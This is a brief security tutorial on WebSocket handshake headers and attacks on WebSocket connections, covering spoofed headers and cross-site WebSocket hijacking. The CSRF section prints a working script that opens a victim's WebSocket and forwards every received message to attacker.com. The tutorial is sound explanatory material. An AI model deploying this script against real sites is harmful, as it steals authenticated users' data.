# WebSocket Handshake and Vulnerabilities

## WebSocket Handshake Features

WebSocket technology establishes a full-duplex communication channel over a single, long-lived connection. The WebSocket handshake process involves several key HTTP headers:

- **Connection and Upgrade**: These headers in both the request and response signal that the connection should be upgraded to a WebSocket.
  
- **Sec-WebSocket-Version**: This request header indicates the WebSocket protocol version the client wishes to use, typically version 13.

- **Sec-WebSocket-Key**: A Base64-encoded random value is sent in this request header. It should be generated anew for each handshake to ensure the security of the WebSocket connection.

- **Sec-WebSocket-Accept**: The response header contains a hash generated from the value submitted in the `Sec-WebSocket-Key`, concatenated with a GUID specified in the WebSocket protocol. This verification step helps prevent misleading responses from misconfigured servers or caching proxies.

## Exploiting WebSocket Vulnerabilities

WebSocket connections can introduce several security risks if not properly configured and handled:

### Misplaced Trust in HTTP Headers

WebSockets may inherit security flaws common in HTTP, such as improper reliance on headers like `X-Forwarded-For` for security decisions.
These headers can be easily spoofed, leading to inaccurate security validations.

### CSRF in WebSockets

Cross-Site Request Forgery (CSRF) can be exploited in WebSocket connections if they rely on session cookies without additional verification. Below is an example of how a CSRF attack could be mounted on a WebSocket:

```
<script>
    var ws = new WebSocket('wss://your-websocket');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://attacker.com', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
```
In this example, the WebSocket connection is abused to send data received from the WebSocket to an attacker-controlled site whenever a message is received.
